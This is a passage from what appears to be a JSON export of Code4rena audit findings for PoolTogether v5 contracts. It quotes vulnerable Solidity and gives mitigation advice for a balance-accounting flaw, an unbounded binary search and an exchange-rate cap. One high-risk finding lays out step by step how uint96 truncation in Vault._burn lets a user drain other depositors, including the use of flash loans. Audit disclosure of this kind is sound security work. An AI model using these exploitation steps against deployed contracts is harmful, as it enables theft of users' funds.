address(0)) {       bool _isFromDelegate = _fromDelegate == _from;        _decreaseBalances(_vault, _from, _amount, _isFromDelegate ? _amount : 0);        if (!_isFromDelegate && _fromDelegate != SPONSORSHIP_ADDRESS) {         _decreaseBalances(_vault, _fromDelegate, 0, _amount);       }        if (         _to == address(0) ||         (_toDelegate == SPONSORSHIP_ADDRESS && _fromDelegate != SPONSORSHIP_ADDRESS)       ) {         _decreaseTotalSupplyBalances(           _vault,           _to == address(0) ? _amount : 0,           (_to == address(0) && _fromDelegate != SPONSORSHIP_ADDRESS) ||             (_toDelegate == SPONSORSHIP_ADDRESS && _fromDelegate != SPONSORSHIP_ADDRESS)             ? _amount             : 0         );       }     } ```  Then, the balance and delegateBalance of `SPONSORSHIP_ADDRESS` will be increased by the same amount. This is not supposed to happen in the first place, as this address is not meant to have any balances. However, the issue described under [#impact](#impact) is due to the fact that the total balances of the vault account will not be adjusted, because the condition `_toDelegate != SPONSORSHIP_ADDRESS` is not met:  ```js     if (_to != address(0)) {       bool _isToDelegate = _toDelegate == _to;        _increaseBalances(_vault, _to, _amount, _isToDelegate ? _amount : 0);        if (!_isToDelegate && _toDelegate != SPONSORSHIP_ADDRESS) {         _increaseBalances(_vault, _toDelegate, 0, _amount);       }        if (         _from == address(0) ||         (_fromDelegate == SPONSORSHIP_ADDRESS && _toDelegate != SPONSORSHIP_ADDRESS)       ) {         _increaseTotalSupplyBalances(           _vault,           _from == address(0) ? _amount : 0,           (_from == address(0) && _toDelegate != SPONSORSHIP_ADDRESS) ||             (_fromDelegate == SPONSORSHIP_ADDRESS && _toDelegate != SPONSORSHIP_ADDRESS)             ? _amount             : 0         );       }     } ```  The ratio of `_userTwab` and `_vaultTwabTotalSupply` plays a role when determining a winner in `TierCalculationLib.isWinner` and the underlying model assumes the invariant to hold true:  ```js     uint256 constrainedRandomNumber = _userSpecificRandomNumber % (_vaultTwabTotalSupply);     uint256 winningZone = calculateWinningZone(_userTwab, _vaultContributionFraction, _tierOdds); ```  If the sum of individual twabs is higher than the sum, there will be more winners than intended, causing the described drainage of the reserve.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Disallow `_to` to be `SPONSORSHIP_ADDRESS`   ## Assessed type  Invalid Validation"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/449", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-03"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/SAQ-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/448", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-04"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/Udsen-G.md)."}, {"title": "The binarySearch exit condition is missing and may go into DOS or revert", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/445", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-02"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/libraries/DrawAccumulatorLib.sol#L454-L456   # Vulnerability details  ## Impact  The binarySearch does not check for overlap between the left and right index of the sliding window, and loops indefinitely when satisfies item not exists in list until revert or gas is exhausted.  ## Proof of Concept  ```solidity     while (true) {       // We start our search in the middle of the `leftSide` and `rightSide`.       // After each iteration, we narrow down the search to the left or the right side while still starting our search in the middle.       currentIndex = (leftSide + rightSide) / 2;        beforeOrAtIndex = uint16(RingBufferLib.wrap(currentIndex, _cardinality));       beforeOrAtDrawId = _drawRingBuffer[beforeOrAtIndex];        afterOrAtIndex = uint16(RingBufferLib.nextIndex(currentIndex, _cardinality));       afterOrAtDrawId = _drawRingBuffer[afterOrAtIndex];        bool targetAtOrAfter = beforeOrAtDrawId <= _targetLastClosedDrawId;        // Check if we've found the corresponding Observation.       if (targetAtOrAfter && _targetLastClosedDrawId <= afterOrAtDrawId) {         break;       }        // If `beforeOrAtTimestamp` is greater than `_target`, then we keep searching lower. To the left of the current index.       if (!targetAtOrAfter) {         rightSide = currentIndex - 1;       } else {         // Otherwise, we keep searching higher. To the left of the current index.         leftSide = currentIndex + 1;       }     } ```  According to the code only `targetAtOrAfter &&_targetLastClosedDrawId <= afterOrAtDrawId` can break loop, if no element in the list meets the condition, it loops indefinitely until the array index overflows or exhausts gas  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Should check `leftSide > rightSide` to break the loop   ## Assessed type  Loop"}, {"title": "The `_currentExchangeRate` of the Vault contract can't increase, and always be lower than or equal to `_assetUnit`", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/443", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1168-L1187   # Vulnerability details  ## Impact The `_currentExchangeRate` of the Vault contract can not increase, and always be lower than or equal to `_assetUnit`. Therefore, when the vault is undercollateralized (`_currentExchangeRate` < `_assetUnit`), it can't be further collateralized. ## Proof of concept ```solidity= function _currentExchangeRate() internal view returns (uint256) {     uint256 _totalSupplyAmount = _totalSupply();     uint256 _totalSupplyToAssets = _convertToAssets(       _totalSupplyAmount,       _lastRecordedExchangeRate,       Math.Rounding.Down     );      uint256 _withdrawableAssets = _yieldVault.maxWithdraw(address(this));      if (_withdrawableAssets > _totalSupplyToAssets) {       _withdrawableAssets = _withdrawableAssets - (_withdrawableAssets - _totalSupplyToAssets);     }      if (_totalSupplyAmount != 0 && _withdrawableAssets != 0) {       return _withdrawableAssets.mulDiv(_assetUnit, _totalSupplyAmount, Math.Rounding.Down);     }      return _assetUnit;   } ``` In case `_totalSupplyAmount != 0 && _withdrawableAssets != 0`, `_currentExchangeRate` function will return a value `_withdrawableAssets * _assetUnit / _totalSupplyAmount`.  However `_withdrawableAssets` can not exceed `_totalSupplyToAssets`, which is equal to `_totalSupplyAmount * _lastRecordedExchangeRate / _assetUnit`.  Therefore, `_currentExchangeRate` always be lower than or equal to `_lastRecordedExchangeRate`.   **Testing**:  Add this assert line and run `forge test` , all tests will passed. ```solidity= if (_totalSupplyAmount != 0 && _withdrawableAssets != 0) {   assert(_withdrawableAssets.mulDiv(_assetUnit, _totalSupplyAmount, Math.Rounding.Down) <= _assetUnit);   return _withdrawableAssets.mulDiv(_assetUnit, _totalSupplyAmount, Math.Rounding.Down); } ```   ## Tool used  Manual Review  ## Recommended Mitigation Steps Remove these lines of code that limit the `_withdrawableAssets` ```solidity= if (_withdrawableAssets > _totalSupplyToAssets) {   _withdrawableAssets = _withdrawableAssets - (_withdrawableAssets - _totalSupplyToAssets); } ```    ## Assessed type  Context"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/441", "labels": ["analysis-advanced", "grade-b", "sponsor confirmed", "A-02"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/0xSmartContract-Analysis.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/440", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "sponsor confirmed", "G-05"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/c3phas-G.md)."}, {"title": "Malicious user can steal other user's deposits from Vault.sol", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/439", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1138-L1139 https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L509-L521 https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L407-L415   # Vulnerability details  ## Impact  When the `Vault.withdraw()` function is called, a maximum of type(uint96).max shares are being burnt subsequently: `Vault.withdraw()`-> `Vault._withdraw()`-> `Vault._burn` burns uint96(_shares), see Vault.sol line 1139.  A malicious user can exploit this in the following way:  1. A malicious user deposits for example two times a value of type(uint96).max underlying assets into the Vault, calling two times the function `Vault.deposit()`. They can't deposit more in a single transaction because type(uint96).max is the maximum value to deposit. 1. Then the malicious user calls `Vault.withdraw()` with a higher value of assets to withdraw than type(uint96).max, for example they withdraw (2 * type(uint96).max) which is the total amount of assets they depositted before. 1. Now what happens is that the Vault.sol contract only burns type(uint96).max shares for the user, but transfers 2 * type(uint96).max underlying assets to the malicious user, which is the total amount they depositted before.  1. This happens because `Vault._burn()` only burns `uint96(shares)` shares of the malicious users - see Vault.sol line 1155.  1. Now the malicious user has still vault shares left but they withdrew the total amount of their depositted assets.  1. Now the vault transferred the total amount of the malicious user's assets back to them, and the malicious user has still shares left to withdraw even more assets that are now being stolen from assets depositted by other users.  1. Or if the malicious user was the first depositor, they wait until another user deposits and the malicious user can now withdraw the other users depositted assets since the malicious user still has Vault shares left.  1. Or if the malicious user is not the first depositor, they use a flashLoan or flashMint to deposit multiple times type(uint96).max assets into the vault, then withdraw their deposit, pay back the flashLoan or flashMint and they will still have enough vault shares left to steal all other users assets by withdrawing them.  In this way, other user's depositted assets can be stolen, as explained above.   ## Proof of Concept  Here is a POC, where the problem is illustrated:  https://gist.github.com/zzzitron/397790302ca95aa3fbf05694ae1497ab  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Consider adjusting the `Vault._burn` function to not convert from uint256 to uint96 when burning shares.   ## Assessed type  Math"}]